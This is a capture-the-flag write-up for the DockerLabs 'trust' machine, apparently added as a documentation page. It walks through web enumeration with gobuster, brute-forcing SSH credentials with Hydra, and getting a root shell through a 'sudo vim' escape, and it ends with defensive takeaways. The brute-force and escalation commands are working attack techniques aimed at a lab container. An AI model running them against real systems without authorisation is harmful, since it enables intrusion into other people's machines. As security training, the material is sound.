@@ -1,0 +1,249 @@
+---
+title: "trust: Web Enumeration and Sudo Privilege Escalation"
+sidebarTitle: "trust"
+description: "Writeup for the trust DockerLabs machine (Very Easy): enumerate a web server to find credentials, gain SSH access, and escalate privileges using a sudo misconfiguration."
+---
+
+trust is a **Very Easy** DockerLabs machine that chains three foundational techniques: web directory enumeration to discover a hidden PHP page leaking a username, SSH credential brute-forcing with Hydra to log in as that user, and a `sudo vim` misconfiguration to escalate directly to root. It is an excellent starter machine for practising the full end-to-end workflow — from passive web footprinting all the way to a root shell.
+
+<Note>
+**Machine Info**
+
+| Field | Details |
+|---|---|
+| Difficulty | Very Easy (Muy Fácil / Súper Fácil) |
+| Category | Hacking Infraestructura |
+| OS | Linux |
+| Key Techniques | Web enumeration, Gobuster, Hydra SSH brute force, sudo abuse (vim) |
+| Default Target IP | 172.17.0.2 |
+</Note>
+
+## Phase 0: Launch Kali Portable
+
+Open a second terminal and start your Kali Portable environment:
+
+```bash
+./run-kali.sh normal
+```
+
+All commands below run **inside** this session.
+
+## Phase 1: Deploy the Machine
+
+Download `trust.zip` from DockerLabs. In your first terminal:
+
+```bash
+unzip trust.zip
+chmod +x auto_deploy.sh
+./auto_deploy.sh trust.tar
+```
+
+Two files are extracted:
+- `auto_deploy.sh` — Bash script that launches the container
+- `trust.tar` — The vulnerable Docker image
+
+## Phase 2: Reconnaissance
+
+<Steps>
+  <Step title="Ping Check">
+    Verify connectivity to the container:
+
+    ```bash
+    ping -c 3 172.17.0.2
+    ```
+  </Step>
+
+  <Step title="Nmap Service Scan">
+    Scan with version detection and default scripts:
+
+    ```bash
+    nmap -sC -sV --min-rate 5000 172.17.0.2
+    ```
+
+    | Argument | Meaning |
+    |---|---|
+    | `-sC` | Runs default NSE scripts |
+    | `-sV` | Detects service versions |
+    | `--min-rate 5000` | Fast rate, suitable for isolated lab use |
+
+    **Findings:**
+
+    | Port | Service | Notes |
+    |---|---|---|
+    | 22/tcp | SSH | Encrypted remote access |
+    | 80/tcp | HTTP | Apache2 web server |
+
+    Two services — a web server and SSH. The web server is the entry point.
+
+    <Warning>
+    Avoid `--min-rate` in real engagements. It is noisy and can trigger security controls. Use `-T3` or slower with `-sS` for stealth.
+    </Warning>
+  </Step>
+
+  <Step title="Browse the Web Server">
+    Open a browser and navigate to `http://172.17.0.2`. The page shows the default **Apache2 Debian** landing page — no custom content, no login form, nothing obviously useful. Move on to active enumeration.
+  </Step>
+</Steps>
+
+## Phase 3: Web Enumeration with Gobuster
+
+The default Apache page is a dead end, but hidden files may exist beneath the surface. Use Gobuster to brute-force paths:
+
+```bash
+gobuster dir \
+  -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -x .php,.txt,.html \
+  -r \
+  --exclude-length 10701 \
+  -t 100
+```
+
+| Argument | Meaning |
+|---|---|
+| `dir` | Directory/file brute-force mode |
+| `-u http://172.17.0.2` | Target URL |
+| `-w common.txt` | SecLists common web paths wordlist |
+| `-x .php,.txt,.html` | Also probe for these file extensions |
+| `-r` | Follow redirects automatically |
+| `--exclude-length 10701` | Filter out false positives with this response length (the Apache default page) |
+| `-t 100` | 100 threads for fast enumeration |
+
+<Info>
+The `--exclude-length 10701` flag is essential here. Without it, every 404-equivalent path returns the default Apache page with a 200 status code and a content length of 10701 bytes, which would flood the results with false positives. Identify the false-positive length from any non-existent path, then filter it out.
+</Info>
+
+**Finding — discovered in ~10 seconds:**
+
+```
+/secret.php   (Status: 200)
+```
+
+Visit `http://172.17.0.2/secret.php` in your browser. The page displays a simple message:
+
+```
+Hola Mario
+```
+
+And a note claiming the web cannot be hacked. Ignore the taunt — the page has inadvertently revealed a **username: `mario`**.
+
+## Phase 4: SSH Brute Force with Hydra
+
+With a username in hand, attempt SSH login. Entering `ssh mario@172.17.0.2` and hitting enter confirms the username is accepted — the server responds with a password prompt rather than rejecting the user outright.
+
+Since this is a Very Easy machine, the password is likely near the top of `rockyou.txt`. Extract only the first 1000 most common passwords to speed up the attack significantly:
+
+```bash
+head -n 1000 /usr/share/wordlists/rockyou.txt > top1000.txt
+```
+
+Run Hydra against the extracted list:
+
+```bash
+hydra -l mario -P top1000.txt ssh://172.17.0.2 -t 4
+```
+
+| Argument | Meaning |
+|---|---|
+| `-l mario` | Known username |
+| `-P top1000.txt` | Trimmed password list (top 1000) |
+| `ssh://172.17.0.2` | Target |
+| `-t 4` | 4 threads |
+
+**Result (found in ~24 seconds):** The password is **`chocolate`**.
+
+```
+[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
+```
+
+## Phase 5: SSH Access
+
+Log in with the discovered credentials:
+
+```bash
+ssh mario@172.17.0.2
+# Password: chocolate
+```
+
+You are now inside the system as the user `mario`.
+
+## Phase 6: Privilege Escalation via Sudo + Vim
+
+<Steps>
+  <Step title="Enumerate Sudo Permissions">
+    The first thing to check on any Linux box after gaining a shell is what `sudo` permissions the current user has:
+
+    ```bash
+    sudo -l
+    ```
+
+    **Output:**
+    ```
+    User mario may run the following commands on trust:
+        (ALL) /usr/bin/vim
+    ```
+
+    The user `mario` can run `vim` as **any user** (including root) with `sudo`. This is a well-known privilege escalation path documented on GTFOBins.
+  </Step>
+
+  <Step title="Escalate to Root via Vim Shell">
+    Use the GTFOBins `sudo` shell escape for vim — option **sudo → Shell → a**:
+
+    ```bash
+    sudo vim -c ':!/bin/sh'
+    ```
+
+    | Part | Meaning |
+    |---|---|
+    | `sudo vim` | Launches vim with root privileges |
+    | `-c ':!/bin/sh'` | Passes a vim command that executes `/bin/sh` as a shell |
+
+    Vim opens with root privileges and immediately drops you into an interactive `/bin/sh` shell running as root.
+  </Step>
+
+  <Step title="Verify Root Access">
+    Confirm the escalation succeeded:
+
+    ```bash
+    whoami
+    # root
+
+    id
+    # uid=0(root) gid=0(root) groups=0(root)
+    ```
+  </Step>
+
+  <Step title="Capture the Flag">
+    Read the root flag:
+
+    ```bash
+    ls /root
+    cat /root/flag.txt
+    ```
+  </Step>
+</Steps>
+
+<Tip>
+**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io)) is an indispensable reference for privilege escalation via sudo and SUID binary abuse. Any time `sudo -l` reveals a command you can run as root, look it up on GTFOBins immediately — many editors, scripting languages, and utilities have documented shell escape techniques.
+</Tip>
+
+## Post-Lab Cleanup
+
+Press `Ctrl+C` in the deploy terminal to stop the container. Type `exit` to leave your Kali Portable session.
+
+## Key Takeaways
+
+<CardGroup cols={2}>
+  <Card title="Never Expose Information in Web Pages" icon="globe">
+    The `secret.php` page handed us a valid username — the pivotal piece of information needed to attack SSH. Even innocuous-looking pages can leak critical data. Avoid displaying usernames, email addresses, or system names in web responses.
+  </Card>
+  <Card title="Targeted Wordlists Save Time" icon="list">
+    Instead of running the full `rockyou.txt` (14 million entries), using the top 1000 reduced the brute-force time from potentially hours to under 30 seconds. Tailor your wordlist to the context: Very Easy machines almost always use common passwords.
+  </Card>
+  <Card title="sudo Editor Access = Root Access" icon="shield-exclamation">
+    Allowing `sudo` on text editors (`vim`, `nano`, `less`, `more`) is functionally the same as granting a root shell. If a user needs to edit a specific config file as root, use `sudoedit` with a path restriction instead of granting full editor access.
+  </Card>
+  <Card title="GTFOBins Is Your Friend" icon="book">
+    GTFOBins catalogs shell escape techniques for dozens of binaries. During any CTF or engagement, if `sudo -l` returns an editor, compiler, interpreter, or file manager — GTFOBins likely has a working escalation path ready to use.
+  </Card>
+</CardGroup>
